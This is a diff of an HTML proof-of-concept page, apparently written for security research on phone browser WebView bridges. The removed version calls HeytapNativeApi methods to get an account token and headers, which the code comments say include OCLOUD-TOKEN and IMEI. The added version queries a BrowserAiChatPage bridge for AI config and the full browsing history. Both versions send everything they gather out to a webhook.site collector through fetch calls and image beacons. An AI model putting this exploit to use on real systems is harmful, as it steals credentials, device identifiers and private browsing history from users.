@@ -1,86 +1,87 @@
 <!doctype html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>FMP_PROBE_INIT</title>
-</head>
+<head><meta charset="utf-8"><title>QH PoC</title></head>
 <body>
-<h1>FMP Bridge Probe</h1>
-<pre id="result" style="word-break:break-all;font-size:12px;">waiting...</pre>
+<h2 id="h">QH PoC</h2>
+<pre id="out" style="white-space:pre-wrap;word-break:break-all;font-size:11px;
+  background:#111;color:#0f0;padding:12px;height:90vh;overflow:auto"></pre>
 <script>
-(function () {
-  const COLLECTOR = "https://webhook.site/d371dea9-a07f-498a-9ca4-55f00d3d2d99";
-  const marker = "FMP_" + Date.now();
+(function(){
+  var qs = new URLSearchParams(location.search);
+  var M  = qs.get("m") || ("QH_" + Date.now());
 
-  function safeString(x) {
-    try { return typeof x === "string" ? x : JSON.stringify(x); }
-    catch (e) { return String(x); }
+  // ── webhook.site UUID ─────────────────
+  var HOOK = "https://webhook.site/6aa0119b-d19a-41c1-8a04-4ad67bacd8d1";
+  // ─────────────────────────────────────────────────────────
+
+  document.getElementById("h").innerText = M;
+
+  function log(k, v) {
+    var val  = (v === undefined) ? "undefined"
+             : (v === null)      ? "null"
+             : (typeof v === "string") ? v
+             : JSON.stringify(v);
+
+    var line = k + " = " + val;
+    console.log("QHPOC " + M + " " + line);
+    document.getElementById("out").textContent += line + "\n";
+
+    // 分片发到 webhook.site（每片 800 字节，防 URL 过长）
+    for (var i = 0, n = 0; i < val.length || n === 0; i += 800, n++) {
+      (function(chunk, idx) {
+        var img = new Image();
+        img.src = HOOK
+          + "?m="  + encodeURIComponent(M)
+          + "&k="  + encodeURIComponent(k + (val.length > 800 ? "__p" + idx : ""))
+          + "&v="  + encodeURIComponent(chunk)
+          + "&t="  + Date.now()
+          + "&r="  + Math.random();
+      })(val.slice(i, i + 800), n);
+    }
   }
 
-  // 把实际数据写进 title + DOM + beacon
-  function report(label, data) {
-    const s = safeString(data);
-    const preview = s.substring(0, 300);
+  var ai = window.BrowserAiChatPage;
 
-    // 1. title（uiautomator 可读）
-    document.title = label + "|" + preview;
+  log("env.url",       location.href);
+  log("env.ua",        navigator.userAgent);
+  log("env.bridge",    typeof ai);
 
-    // 2. DOM（uiautomator dump 可读）
-    var el = document.getElementById("result");
-    if (el) el.textContent += "\n\n[" + label + "]\n" + s;
-
-    // 3. fetch 发全量数据
-    var url = COLLECTOR
-      + "?m="     + encodeURIComponent(marker)
-      + "&label=" + encodeURIComponent(label)
-      + "&len="   + encodeURIComponent(String(s.length))
-      + "&data="  + encodeURIComponent(s.substring(0, 2000));
-    try { fetch(url).catch(function(){}); } catch(e) {}
-
-    // 4. Image beacon 兜底（fetch 被拦截时用这个）
-    try { new Image().src = url; } catch(e) {}
+  if (!ai) {
+    log("STOP", "BrowserAiChatPage not injected");
+    return;
   }
 
-  report("PAGE_LOADED", "bridge=" + typeof window.HeytapNativeApi);
+  // ── 1. getAIApiVersion ────────────────────────────────────
+  try { log("getAIApiVersion", ai.getAIApiVersion()); }
+  catch(e) { log("getAIApiVersion_ERR", e.message); }
 
-  // 拦截异步回调
-  window.HeytapJsApi = window.HeytapJsApi || {};
-  var oldCb = window.HeytapJsApi.callback;
-  window.HeytapJsApi.callback = function(id, result) {
-    report("CALLBACK_" + id, result);   // ← 实际数据在这里
-    if (typeof oldCb === "function") {
-      try { oldCb.apply(this, arguments); } catch(e) {}
+  // ── 2. getToolboxWebAIConfig ──────────────────────────────
+  try { log("getToolboxWebAIConfig", ai.getToolboxWebAIConfig()); }
+  catch(e) { log("getToolboxWebAIConfig_ERR", e.message); }
+
+  // ── 3. queryHistory — 完整逐条上报 ───────────────────────
+  try {
+    var raw = ai.queryHistory();
+    log("queryHistory_raw", raw);
+
+    try {
+      var obj  = (typeof raw === "string") ? JSON.parse(raw) : raw;
+      var list = obj.dataList || obj.data || obj.list || obj;
+      if (Array.isArray(list)) {
+        log("queryHistory_count", String(list.length));
+        list.forEach(function(item, i) {
+          log("item_" + i + "_url",   item.url   || "");
+          log("item_" + i + "_title", item.title || "");
+        });
+      }
+    } catch(e2) {
+      log("queryHistory_parse_ERR", e2.message);
     }
-  };
+  } catch(e) {
+    log("queryHistory_ERR", e.message);
+  }
 
-  setTimeout(function () {
-    if (typeof window.HeytapNativeApi === "undefined") {
-      report("ERROR", "HeytapNativeApi not found");
-      return;
-    }
-
-    // getToken
-    try {
-      window.HeytapNativeApi.invoke(
-        "find_phone_client.getToken", "{}", "cb_token"
-      );
-    } catch(e) { report("getToken_ERR", String(e)); }
-
-    // getHeaderJson（含 OCLOUD-TOKEN / OCLOUD-IMEI）
-    try {
-      window.HeytapNativeApi.invoke(
-        "find_phone_client.getHeaderJson", "{}", "cb_header"
-      );
-    } catch(e) { report("getHeaderJson_ERR", String(e)); }
-
-    // getAppInfo
-    try {
-      window.HeytapNativeApi.invoke(
-        "find_phone_client.getAppInfo", "{}", "cb_appinfo"
-      );
-    } catch(e) { report("getAppInfo_ERR", String(e)); }
-
-  }, 1500);
+  log("FINAL", "done");
 })();
 </script>
 </body>
